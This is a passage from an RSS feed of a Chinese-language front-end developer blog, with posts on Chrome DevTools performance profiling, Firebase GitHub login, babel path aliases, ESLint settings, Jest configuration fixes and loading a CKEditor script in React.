</p><cite>柳传志</cite></blockquote><p>性能优化就像水桶效应，应该找到并修复最低的那块木板。</p><p>下面进入正题：</p><p>TL;DR</p><ul><li>使用什么工具？</li><li>工具的使用方法？</li><li>有哪些指标？</li></ul><h2 class="">使用什么工具？</h2><p>一提到性能测试，老一辈的程序员总会说“写脚本测”。但是现在已经是 2019 年了，请不要像原始人一下从头开始。</p><p>这里推荐大家使用 Chrome DevTools Performance</p><h2 class="">工具的使用方法？</h2><p>Chrome DevTools Performance 使用方法很简单。</p><ol><li>使用 incognito 模式打开 Chrome</li><li>打开你想要测试的网页，如 <a class="tc-tiddlylink-external" href="https://jiang.jifa.name" rel="noopener noreferrer" target="_blank">https://jiang.jifa.name</a></li><li>打开 Chrome DevTools，选择 Performance</li><li>点击自动记录按钮</li></ol><p><img src="https://i.gyazo.com/159c7857ffa7cfbbaa7fc37a515f155a.png"></p><p>使用 incognito 模式主要是为了避免 Chrome 插件对测试的影响。
对于准备测试环境，还有一些其他方法。查看 <a class="tc-tiddlylink-external" href="https://developer.chrome.com/devtools/docs/clean-testing-environment" rel="noopener noreferrer" target="_blank">https://developer.chrome.com/devtools/docs/clean-testing-environment</a></p><h2 class="">有哪些指标？</h2><p>我们可以看到上图中 ④ 显示了一张饼状图。饼状图所对应的表如下：</p><table><tbody><tr class="evenRow"><td align="center">Name</td><td align="center">项目</td></tr><tr class="oddRow"><td align="center">Loading</td><td align="center">HTML 文件</td></tr><tr class="evenRow"><td align="center">Scripting</td><td align="center">脚本</td></tr><tr class="oddRow"><td align="center">Rendering</td><td align="center">样式表</td></tr><tr class="evenRow"><td align="center">Painting</td><td align="center">媒体资源</td></tr><tr class="oddRow"><td align="center">System</td><td align="center">其他资源</td></tr><tr class="evenRow"><td align="center">Idle</td><td align="center">空闲时间</td></tr></tbody></table><p>从上面图中可以看出，我所测试的网页中 <code>Scripting</code> 耗时占了 50% 以上，如果想对其进行性能优化，我们最该优化的地方就是我们的脚本。</p><p>refs:</p><ul><li><a class="tc-tiddlylink-external" href="https://developers.google.com/web/tools/chrome-devtools/evaluate-performance/reference" rel="noopener noreferrer" target="_blank">https://developers.google.com/web/tools/chrome-devtools/evaluate-performance/reference</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Tue, 26 January 2021 22:37:15 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2019-05-16–qian-duan-xing-nen-you-hua–yi–xing-nen-ping-gu</guid>      
   </item>

   <item>
      <title>2019-05-14 如何使用 GitHub 账号登录？</title>
      <link>https://thaddeusjiang.com/2019-05-14–ru-he-shi-yong-github–zhang-hao-deng-lu-</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2019-05-14 如何使用 GitHub 账号登录？</h1>
            <hr>

            <p>一个特别简单的需求，开发一个使用 GitHub 登陆的功能。</p><p>如图：</p><p><img src="https://i.gyazo.com/fd8686eff0b781065b1edccefa367169.png"></p><p>TL;DR</p><ol><li>创建一个 firebase 项目</li><li>注册一个 GitHub 应用</li><li>代码示例</li></ol><h1 class="">创建 firebase 项目</h1><p>登录 <a class="tc-tiddlylink-external" href="https://console.firebase.google.com" rel="noopener noreferrer" target="_blank">https://console.firebase.google.com</a>，并创建一个项目。
进入 Auth 菜单，启用 GitHub。</p><p><img src="https://i.gyazo.com/ee6c38969827c543c68ef212adb6dd8f.png"></p><p>客户端 ID 和客户端密钥可以从 GitHub App 完成界面获取。</p><h1 class="">注册一个 GitHub 应用</h1><p>进入 <a class="tc-tiddlylink-external" href="https://github.com/settings/applications/new" rel="noopener noreferrer" target="_blank">https://github.com/settings/applications/new</a></p><p><img src="https://i.gyazo.com/75d40005a9a8d9f193819c8e471a7e30.png"></p><p>Homepage URL 和 Callback URL 填写 firebase 回调网址。如 <code>https://xxx.firebaseapp.com/__/auth/handler</code></p><h1 class="">代码示例</h1><pre class="js hljs"><code><span class="hljs-keyword">import</span> React, { useState, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;
<span class="hljs-keyword">import</span> ReactDOM <span class="hljs-keyword">from</span> <span class="hljs-string">"react-dom"</span>;

<span class="hljs-keyword">import</span> <span class="hljs-string">"./styles.css"</span>;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">App</span>(<span class="hljs-params"></span>) </span>{
  <span class="hljs-keyword">let</span> firebase = <span class="hljs-literal">null</span>;

  <span class="hljs-keyword">const</span> [logined, setResult] = useState(<span class="hljs-literal">false</span>);

  useEffect(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> {
    firebase = <span class="hljs-built_in">window</span>.firebase;
  });

  <span class="hljs-keyword">const</span> handleLogin = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> {
    <span class="hljs-keyword">var</span> provider = <span class="hljs-keyword">new</span> firebase.auth.GithubAuthProvider();
    provider.addScope(<span class="hljs-string">"repo"</span>);
    provider.setCustomParameters({
      <span class="hljs-attr">allow_signup</span>: <span class="hljs-string">"false"</span>
    });
    firebase
      .auth()
      .signInWithPopup(provider)
      .then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">result</span>) </span>{
        setResult(<span class="hljs-string">"SUCCESS"</span>);
      })
      .catch(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">error</span>) </span>{
        setResult(<span class="hljs-string">"FAIL"</span>);
      });
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"App"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>GitHub Login Example<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
      {!logined &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleLogin}</span>&gt;</span>Sign in with GitHub<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>}
      {logined &amp;&amp; "Logined"}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}

<span class="hljs-keyword">const</span> rootElement = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"root"</span>);
ReactDOM.render(<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span>, rootElement);</code></pre><blockquote><div>source code: <a class="tc-tiddlylink-external" href="https://codesandbox.io/s/zw27vrzpk3" rel="noopener noreferrer" target="_blank">https://codesandbox.io/s/zw27vrzpk3</a></div></blockquote>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Fri, 22 January 2021 21:44:58 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2019-05-14–ru-he-shi-yong-github–zhang-hao-deng-lu-</guid>      
   </item>

   <item>
      <title>2018-08-16 Say Goodbye to '../' '../../' '../../../'</title>
      <link>https://thaddeusjiang.com/2018-08-16-say-goodbye-to------------------------—</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2018-08-16 Say Goodbye to '../' '../../' '../../../'</h1>
            <hr>

            <p>开发 JavaScript 时，你有没有遇到过这样的情况。</p><p>页面复用大量共通组件，这些共通组件大体都在同一个文件夹下。但是由于组件分割和文件夹层级较深的缘故，你可能常常会写出如下代码：</p><pre class="js hljs"><code><span class="hljs-comment">// some.js</span>
<span class="hljs-keyword">import</span> VodMediaPlayer <span class="hljs-keyword">from</span> <span class="hljs-string">'../../../components/VodVideo/VodMediaPlayer'</span>
<span class="hljs-keyword">import</span> VideoInfo <span class="hljs-keyword">from</span> <span class="hljs-string">'../../../components/VodVideo/VideoInfo'</span>
<span class="hljs-keyword">import</span> RecommendList <span class="hljs-keyword">from</span> <span class="hljs-string">'../../../components/RecommendList/RecommendList'</span>
<span class="hljs-keyword">import</span> Comment <span class="hljs-keyword">from</span> <span class="hljs-string">'../../../components/Comment/Comment'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-keyword">get</span>, mediaPath } from '../../../util/fetch'
import { API_VIDEO, API_CHANNEL } <span class="hljs-keyword">from</span> <span class="hljs-string">'../../../util/constants'</span></code></pre><p>你知道自己在键盘上敲击 <code>../</code> <code>../../</code> <code>../../../</code> 时浪费了多少时间吗？</p><blockquote class="tc-quote tc-big-quote"><p>时间就是金钱。
</p><cite>名言</cite></blockquote><p>为了解决这种问题，主流的前端工具都给出了解决方案。</p><p>本文介绍如何使用 babel plugin 的解决方案。</p><h2 class="">正文</h2><p>首先我们选择 babel-plugin-module-resolver。</p><p>1. 安装</p><pre><code>$ npm install --save-dev babel-plugin-module-resolver</code></pre><p>2. 配置 .babelrc</p><pre class="json hljs"><code>{
  <span class="hljs-attr">"presets"</span>: [<span class="hljs-string">"env"</span>, <span class="hljs-string">"react"</span>],
  <span class="hljs-attr">"plugins"</span>: [
    [<span class="hljs-string">"module-resolver"</span>, {
      <span class="hljs-attr">"root"</span>: [<span class="hljs-string">"./"</span>],
      <span class="hljs-attr">"alias"</span>: {
        <span class="hljs-attr">"components"</span>: <span class="hljs-string">"./src/components"</span>,
        <span class="hljs-attr">"util"</span>: <span class="hljs-string">"./src/util"</span>
      }
    }]
}</code></pre><p>这时你的代码可以修改为如下：</p><pre class="js hljs"><code><span class="hljs-comment">// some.js</span>
<span class="hljs-keyword">import</span> VodMediaPlayer <span class="hljs-keyword">from</span> <span class="hljs-string">'components/VodVideo/VodMediaPlayer'</span>
<span class="hljs-keyword">import</span> VideoInfo <span class="hljs-keyword">from</span> <span class="hljs-string">'components/VodVideo/VideoInfo'</span>
<span class="hljs-keyword">import</span> RecommendList <span class="hljs-keyword">from</span> <span class="hljs-string">'components/RecommendList/RecommendList'</span>
<span class="hljs-keyword">import</span> Comment <span class="hljs-keyword">from</span> <span class="hljs-string">'components/Comment/Comment'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-keyword">get</span>, mediaPath } from 'util/fetch'
import { API_VIDEO, API_CHANNEL } <span class="hljs-keyword">from</span> <span class="hljs-string">'util/constants'</span></code></pre><p>注意： 如果你使用了 eslint，这时 eslint 会报错，因为它不能处理新的写法。</p><p>3. 添加对应的 eslint plugin</p><p>我们选择 eslint-import-resolver-babel-module</p><pre><code>$ npm install --save-dev eslint-plugin-import eslint-import-resolver-babel-module</code></pre><p>配置 .eslintrc</p><pre class="json hljs"><code>"settings": {
  "import/resolver": {
    "babel-module": {}
  }
}</code></pre><p>注意： 这时 eslint 不会报错了， 但是你会发现你点击 import 后面的组件名， VSCode 不会自动跳转到组件定义。</p><p>4. 在项目根目录下添加 jsconfig.json 解决</p><pre class="json hljs"><code>{
  <span class="hljs-attr">"compilerOptions"</span>: {
    <span class="hljs-attr">"baseUrl"</span>: <span class="hljs-string">"."</span>,
    <span class="hljs-attr">"paths"</span>: {
      <span class="hljs-attr">"components/*"</span>: [<span class="hljs-string">"src/components/*"</span>],
      <span class="hljs-attr">"util/*"</span>: [<span class="hljs-string">"src/util/*"</span>],
      <span class="hljs-attr">"locales/*"</span>: [<span class="hljs-string">"src/locales/*"</span>]
    }
  }
}</code></pre><p>到此为止，我们终于可以 <strong>Say Goodbye to '../' '../../' '../../../</strong>' 了。</p><p>refs:</p><ul><li><a class="tc-tiddlylink-external" href="https://github.com/tleunen/babel-plugin-module-resolver" rel="noopener noreferrer" target="_blank">https://github.com/tleunen/babel-plugin-module-resolver</a></li><li><a class="tc-tiddlylink-external" href="https://github.com/tleunen/eslint-import-resolver-babel-module" rel="noopener noreferrer" target="_blank">https://github.com/tleunen/eslint-import-resolver-babel-module</a></li></ul><blockquote class="tc-quote"><p>本文曾发布于 segmentfualt，<a class="tc-tiddlylink-external" href="https://segmentfault.com/a/1190000016033668" rel="noopener noreferrer" target="_blank">https://segmentfault.com/a/1190000016033668</a>
</p></blockquote>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Mon, 28 June 2021 14:27:32 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2018-08-16-say-goodbye-to------------------------—</guid>      
   </item>

   <item>
      <title>2018-05-12 在 airbnb 的 eslint 基础上，我做了哪些调整</title>
      <link>https://thaddeusjiang.com/2018-05-12–zai-airbnb–de-eslint–ji-chu-shang–wo-zuo-liao-na-xie-diao-zheng</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2018-05-12 在 airbnb 的 eslint 基础上，我做了哪些调整</h1>
            <hr>

            <blockquote class="tc-quote tc-big-quote"><p>没有完美的解决方案，适合自己的才是最好的。
</p><cite>TJ</cite></blockquote><p>无分号</p><pre class="js hljs"><code><span class="hljs-string">"semi"</span>: [<span class="hljs-string">"warn"</span>, <span class="hljs-string">"never"</span>],</code></pre><p>允许 console 输出 <code>warn</code> <code>error</code></p><pre class="js hljs"><code><span class="hljs-string">"no-console"</span>: [<span class="hljs-string">"error"</span>, { <span class="hljs-string">"allow"</span>: [<span class="hljs-string">"warn"</span>, <span class="hljs-string">"error"</span>] }],</code></pre><p>允许简单运算符混合运用（ + - \* / 等），依旧禁止复杂运算符混合运用</p><pre class="js hljs"><code><span class="hljs-string">"no-mixed-operators"</span>: [
    <span class="hljs-string">"error"</span>,
    {
        <span class="hljs-string">"groups"</span>: [
            [<span class="hljs-string">"&amp;"</span>, <span class="hljs-string">"|"</span>, <span class="hljs-string">"^"</span>, <span class="hljs-string">"~"</span>, <span class="hljs-string">"&lt;&lt;"</span>, <span class="hljs-string">"&gt;&gt;"</span>, <span class="hljs-string">"&gt;&gt;&gt;"</span>],
            [<span class="hljs-string">"=="</span>, <span class="hljs-string">"!="</span>, <span class="hljs-string">"==="</span>, <span class="hljs-string">"!=="</span>, <span class="hljs-string">"&gt;"</span>, <span class="hljs-string">"&gt;="</span>, <span class="hljs-string">"&lt;"</span>, <span class="hljs-string">"&lt;="</span>],
            [<span class="hljs-string">"&amp;&amp;"</span>, <span class="hljs-string">"||"</span>],
            [<span class="hljs-string">"in"</span>, <span class="hljs-string">"instanceof"</span>]
        ],
        <span class="hljs-string">"allowSamePrecedence"</span>: <span class="hljs-literal">true</span>
    }
  ],</code></pre><p>其实还有很多，过段时间公开配置文件。
</p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Fri, 22 January 2021 21:19:34 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2018-05-12–zai-airbnb–de-eslint–ji-chu-shang–wo-zuo-liao-na-xie-diao-zheng</guid>      
   </item>

   <item>
      <title>2018-05-11 VSCode 如何自动补全 Jest 断言？</title>
      <link>https://thaddeusjiang.com/2018-05-11-vscode–ru-he-zi-dong-bu-quan-jest–duan-yan-</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2018-05-11 VSCode 如何自动补全 Jest 断言？</h1>
            <hr>

            <p>背景</p><p>我是用 VSCode 开发 js 代码，使用 Jest 作为测试框架。安装了<code> vscode-jest</code> 插件。</p><p>问题</p><p>VSCode 不能自动补全 expect 后的 <code>断言</code>。</p><p>vscode-jest README 上显示的👇的动图，让我误以为 vscode-jest 自带这种自动补全功能。然而它并没有。</p><p><img src="https://raw.githubusercontent.com/jest-community/vscode-jest/master/images/vscode-jest.gif"></p><p>解决方法</p><p>安装 <code>@types/jest</code>，</p><pre class="bash hljs"><code>$ yarn add @types/jest --dev</code></pre><p>refs:</p><ul><li><a class="tc-tiddlylink-external" href="https://github.com/jest-community/vscode-jest/issues/78" rel="noopener noreferrer" target="_blank">https://github.com/jest-community/vscode-jest/issues/78</a></li><li><a class="tc-tiddlylink-external" href="https://github.com/jest-community/vscode-jest" rel="noopener noreferrer" target="_blank">https://github.com/jest-community/vscode-jest</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Fri, 22 January 2021 21:15:42 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2018-05-11-vscode–ru-he-zi-dong-bu-quan-jest–duan-yan-</guid>      
   </item>

   <item>
      <title>2018-05-09 解决 Jest "SyntaxError Unexpected token import"</title>
      <link>https://thaddeusjiang.com/2018-05-09–jie-jue-jest–syntaxerror-unexpected-token-import-</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2018-05-09 解决 Jest "SyntaxError Unexpected token import"</h1>
            <hr>

            <p>应该是 <code>Jest “SyntaxError Unexpected token import”</code> 最简单的解决方案。</p><h2 class="">背景</h2><p>React 的 SPA 项目，使用 And Design 作为 UI 框架。
使用 Jest + Enzyme 进行单体测试。</p><p>Antd 使用 <code>babel-plugin-import</code>  按需加载。
.babelrc</p><pre class="json hljs"><code>{
  <span class="hljs-attr">"presets"</span>: [<span class="hljs-string">"env"</span>, <span class="hljs-string">"react"</span>, <span class="hljs-string">"stage-0"</span>],
  <span class="hljs-attr">"plugins"</span>: [
    [
      <span class="hljs-string">"import"</span>,
      {
        <span class="hljs-attr">"libraryName"</span>: <span class="hljs-string">"antd"</span>,
        <span class="hljs-attr">"libraryDirectory"</span>: <span class="hljs-string">"es"</span>,
        <span class="hljs-attr">"style"</span>: <span class="hljs-literal">true</span>
      }
    ]
  ]
}</code></pre><p>问题</p><p>Jest 执行测试时出现 SyntaxError: Unexpected token import 错误。</p><p><img src="https://user-images.githubusercontent.com/17308201/39807414-347f9684-53b7-11e8-878f-1a99c6ea875d.png"></p><p>原因：Jest 无法理解 ES6 的 <code>import</code> 特性。</p><p>解决方法：</p><p>第 1 步：删掉 bebel-plugin-import 配置中 <code>libraryDirectory</code> 的部分。</p><pre class="json hljs"><code><span class="hljs-comment">// .babelrc</span>
{
  <span class="hljs-attr">"presets"</span>: [<span class="hljs-string">"env"</span>, <span class="hljs-string">"react"</span>, <span class="hljs-string">"stage-0"</span>],
  <span class="hljs-attr">"plugins"</span>: [
    [
      <span class="hljs-string">"import"</span>,
      {
        <span class="hljs-attr">"libraryName"</span>: <span class="hljs-string">"antd"</span>,
        <span class="hljs-attr">"style"</span>: <span class="hljs-literal">true</span>
      }
    ]
  ]
}</code></pre><p>这时，运行 jest 会出现 ReferenceError: Select is not defined 错误。</p><p><img src="https://user-images.githubusercontent.com/17308201/39807911-85bc09e6-53b8-11e8-83d3-fc66830bb5e2.png"></p><p>第 2 步：安装 babel-plugin-transform-es2015-modules-commonjs</p><pre class="sh hljs"><code>$ yarn add --dev babel-plugin-transform-es2015-modules-commonjs</code></pre><p>更新 .babelrc</p><pre class="json hljs"><code><span class="hljs-comment">// .babelrc</span>
{
  <span class="hljs-attr">"presets"</span>: [<span class="hljs-string">"env"</span>, <span class="hljs-string">"react"</span>, <span class="hljs-string">"stage-0"</span>],
  <span class="hljs-attr">"plugins"</span>: [
    <span class="hljs-string">"transform-es2015-modules-commonjs"</span>,
    [
      <span class="hljs-string">"import"</span>,
      {
        <span class="hljs-attr">"libraryName"</span>: <span class="hljs-string">"antd"</span>,
        <span class="hljs-attr">"style"</span>: <span class="hljs-literal">true</span>
      }
    ]
  ]
}</code></pre><p>再次运行 jest，问题解决了。</p><p><img src="https://user-images.githubusercontent.com/17308201/39808022-d5250500-53b8-11e8-8158-4b0825482904.png"></p><p>refs:</p><ul><li><a class="tc-tiddlylink-external" href="https://github.com/ant-design/ant-design/issues/5362" rel="noopener noreferrer" target="_blank">https://github.com/ant-design/ant-design/issues/5362</a></li><li><a class="tc-tiddlylink-external" href="https://github.com/ant-design/babel-plugin-import/issues/189" rel="noopener noreferrer" target="_blank">https://github.com/ant-design/babel-plugin-import/issues/189</a></li><li><a class="tc-tiddlylink-external" href="https://www.npmjs.com/package/babel-plugin-import" rel="noopener noreferrer" target="_blank">https://www.npmjs.com/package/babel-plugin-import</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Fri, 22 January 2021 21:9:6 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2018-05-09–jie-jue-jest–syntaxerror-unexpected-token-import-</guid>      
   </item>

   <item>
      <title>2018-05-08 Jest 测试 CSS Modules</title>
      <link>https://thaddeusjiang.com/2018-05-08-jest–ce-shi-css-modules</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2018-05-08 Jest 测试 CSS Modules</h1>
            <hr>

            <blockquote class="tc-quote tc-big-quote"><p>CSS Modules 解决了 CSS 全局作用域的问题，但是也引入了新的不便。
</p></blockquote><p>记录一下，Jest 如何测试 CSS Modules。</p><h2 class="">背景</h2><p>React 的 SPA 项目，使用 Parcel.js 作为打包工具。使用 CSS Modules 模块化开发样式。</p><blockquote class="tc-quote tc-big-quote"><p>Parcel.js：极速零配置 Web 应用打包工具。</p><p>注：假的！配置少，但不是 0 配置。
</p></blockquote><h2 class="">问题</h2><p>Jest 运行测试时无法理解 Less 语法， Less 代码无法转换成 JS 代码。</p><p><img src="https://user-images.githubusercontent.com/17308201/39739266-ffe965d6-52ca-11e8-9b08-fccffc594c80.png"></p><p>解决方法</p><p>使用 <code>identity-obj-proxy</code> mock CSS Modules。</p><p>1. install identity-obj-proxy</p><pre class="bash hljs"><code>$ yarn add --dev identity-obj-proxy</code></pre><p>2. 修改 package.json 中 <code>jest</code> 配置</p><pre class="js hljs"><code><span class="hljs-string">"jest"</span>: {
  ...
  <span class="hljs-string">"moduleNameMapper"</span>: {
    <span class="hljs-string">"\\.(css|less)$"</span>: <span class="hljs-string">"identity-obj-proxy"</span>
  }
},</code></pre><p>再次运行 <code>jest</code>，Jest 可以理解 Less 语法了。</p><p><img src="https://user-images.githubusercontent.com/17308201/39739437-d18fa7c6-52cb-11e8-9ad8-2b2f9a34728d.png"></p><p>ref:</p><ul><li><a class="tc-tiddlylink-external" href="https://facebook.github.io/jest/docs/en/webpack.html#mocking-css-modules" rel="noopener noreferrer" target="_blank">https://facebook.github.io/jest/docs/en/webpack.html#mocking-css-modules</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Fri, 22 January 2021 21:4:35 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2018-05-08-jest–ce-shi-css-modules</guid>      
   </item>

   <item>
      <title>2018-04-28 React JS/JSX 中引用静态 js 文件</title>
      <link>https://thaddeusjiang.com/2018-04-28-react-js-jsx–zhong-yin-yong-jing-tai-js–wen-jian</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2018-04-28 React JS/JSX 中引用静态 js 文件</h1>
            <hr>

            <blockquote class="tc-quote tc-big-quote"><p>如果你有一个上古时代的 js 文件，你会直接引用它，还是重写一遍？
</p><cite>TJ</cite></blockquote><p>React JS/JSX 中引用静态 js 文件，其实超简单。
只需要在 componentDidMount 创建一个 <code>&lt;script&gt;</code> 标签，并且追加到页面中即可。</p><pre class="js hljs"><code>componentDidMount () {
  <span class="hljs-keyword">const</span> script = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">"script"</span>)
  script.src = <span class="hljs-string">"https://cdn..."</span>
  script.async = <span class="hljs-literal">true</span>

  <span class="hljs-built_in">document</span>.body.appendChild(script)
}</code></pre><h2 class="">应用场景</h2><p>目前项目是 toB 的内容管理系统，由于某些不可抗力因素影响，不得不对应  CKEditor 4。
但是 CKEditor 4 并不支持 JS 模块，所以不能够使用 import 导入。</p><p>无奈之下只能使用传统方法</p><pre class="html hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.ckeditor.com/4.9.2/standard/ckeditor.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>因为只有部分页面使用 CKEditor，在 index.html 中引入 CKEditor 的静态文件有点过分了。</p><p>所以我通过组件的 componentDidMount 引入。</p><p>ref:</p><ul><li><a class="tc-tiddlylink-external" href="http://cdn.ckeditor.com/" rel="noopener noreferrer" target="_blank">http://cdn.ckeditor.com/</a></li><li><a class="tc-tiddlylink-external" href="https://stackoverflow.com/questions/34424845/adding-script-tag-to-react-jsx" rel="noopener noreferrer" target="_blank">https://stackoverflow.com/questions/34424845/adding-script-tag-to-react-jsx</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Fri, 22 January 2021 20:58:25 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2018-04-28-react-js-jsx–zhong-yin-yong-jing-tai-js–wen-jian</guid>      
   </item>

   <item>
      <title>2018-04-27 最简单的代码重构</title>
      <link>https://thaddeusjiang.com/2018-04-27–zui-jian-dan-de-dai-ma-zhong-gou</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2018-04-27 最简单的代码重构</h1>
            <hr>

            <p>一个 Code Review 的心得</p><blockquote class="tc-quote tc-big-quote"><p>最简单的代码重构，就是把重复代码提取成函数。
</p><cite>TJ</cite></blockquote><p>重构前</p><p><img src="https://user-images.githubusercontent.com/17308201/39341071-5cc81a76-4a0c-11e8-837d-ada35b7709df.png"></p><p>其实这个功能超级简单，就是判断一下当前环境是否是 <code>dcs</code> 环境。</p><blockquote><div>dcs: [DreamArts Clound Service](<a class="tc-tiddlylink-external" href="https://www.dreamarts.co.jp/dcs/" rel="noopener noreferrer" target="_blank">https://www.dreamarts.co.jp/dcs/</a>) 是我司提供的云服务平台。</div></blockquote><p>重构后</p><pre class="js hljs"><code><span class="hljs-comment">// envUtil.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isClound</span>(<span class="hljs-params"></span>) </span>{
  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">window</span>.config !== <span class="hljs-literal">undefined</span>) {
